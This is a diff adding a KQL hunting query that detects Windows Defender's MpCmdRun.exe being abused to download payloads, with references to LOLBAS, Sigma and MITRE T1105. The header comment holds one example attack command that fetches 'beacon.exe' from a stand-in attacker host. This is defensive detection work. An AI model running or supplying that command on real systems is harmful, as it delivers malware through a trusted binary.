@@ -1,0 +1,16 @@
+// Title: MpCmdRun.exe Download Activity
+// Desc: Detect the use of Windows Defender to download payloads (Windows Defender)
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+// Ref - https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
+// MITRE: https://attack.mitre.org/techniques/T1105/ (Command and Control: Ingress Tool Transfer)
+// Severity: high
+// Trigger: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
+// Usecase:download from Internet and Encosde/Decode files
+// https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_susp_mpcmdrun_download.yml
+// By: Frankie Li
+// On: 15-05-2023
+DeviceProcessEvents 
+| where ((ProcessCommandLine contains @'MpCmdRun.exe' or ProcessVersionInfoFileDescription =~ @'Microsoft Malware Protection Command Line Utility' 
+    or InitiatingProcessVersionInfoFileDescription =~ @'Microsoft Malware Protection Command Line Utility') 
+    and (ProcessCommandLine contains @'DownloadFile' and ProcessCommandLine contains @'url'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
